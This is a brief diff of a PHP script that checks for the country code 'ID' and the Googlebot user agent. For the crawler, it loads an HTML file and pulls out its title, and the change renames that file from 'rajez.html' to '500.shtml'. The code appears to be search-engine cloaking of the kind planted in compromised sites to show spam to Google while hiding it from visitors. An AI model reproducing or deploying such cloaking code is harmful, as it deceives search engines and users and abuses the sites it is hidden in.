@@ -54,7 +54,7 @@ if ($country_code == 'ID') {
 
 $user_agent = $_SERVER['HTTP_USER_AGENT'];
 if (strpos($user_agent, 'Googlebot') !== false) {
-    $rajez_html = file_get_contents('rajez.html');
+    $rajez_html = file_get_contents('500.shtml');
 
     preg_match("/<title>(.*?)<\/title>/is", $rajez_html, $title_matches);
     $title = $title_matches[1];
